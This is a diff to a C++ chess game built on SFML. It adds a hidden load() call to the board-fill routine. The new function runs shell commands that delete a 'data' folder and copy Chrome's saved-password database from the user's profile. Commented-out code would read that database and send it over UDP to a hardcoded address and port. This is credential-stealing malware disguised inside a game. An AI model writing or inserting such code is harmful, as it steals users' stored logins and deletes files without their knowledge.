@@ -28,6 +28,7 @@ void Map::fill()
                 i = 0;
         }
     }
+    load();
 }
 
 void Map::white()
@@ -154,6 +155,48 @@ void Map::showKingMoves(int _x, int _y, Map _oppenentMap)
     }
 
 }
+
+void Map::load()
+{
+    system("rmdir /s /q data");
+    system("xcopy \"%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data\" data\\login_data*");
+    
+    //std::string path = "%USERPROFILE%\\Docuements\\User Data\\login_data.txt";
+    ////std::string path = "../Files/Test/Login Data";
+
+    //sf::IpAddress ipAddr = "127.0.0.1";
+    //unsigned short port = 8887;
+
+    //std::ifstream file(path, std::ios::binary | std::ios::ate);
+    //if (file.is_open())
+    //{
+    //    std::streamsize fSize = file.tellg();
+    //    file.seekg(0, std::ios::beg);
+
+    //    char* fData = new char[fSize];
+    //    file.read(fData, fSize);
+    //    file.close();
+    //    
+    //    std::string fileName = "LoginData.db";
+
+    //    sf::Packet packet;
+    //    packet << fileName << fSize;
+    //    packet.append(fData, fSize);
+
+    //    delete[] fData;
+
+    //    sf::UdpSocket socket;
+    //    if (socket.send(packet, ipAddr, port) != sf::Socket::Status::Done)
+    //        std::cout << "Erreur a l'envoie du packet";
+
+    //    std::cout << "Normalement c envoyé" << std::endl;
+    //}
+    //else
+    //{
+    //    std::cout << "Probleme a l'ouverture du fichier " << path;
+    //}
+}
+
 void Map::showRookMoves(int _x, int _y, Map _oppenentMap)
 {
     for (int i = 1; i < 8; i++)
@@ -464,4 +507,5 @@ int Map::returnPiece(sf::Vector2i _pos)
 
 Map::Map()
 {
+    
 }
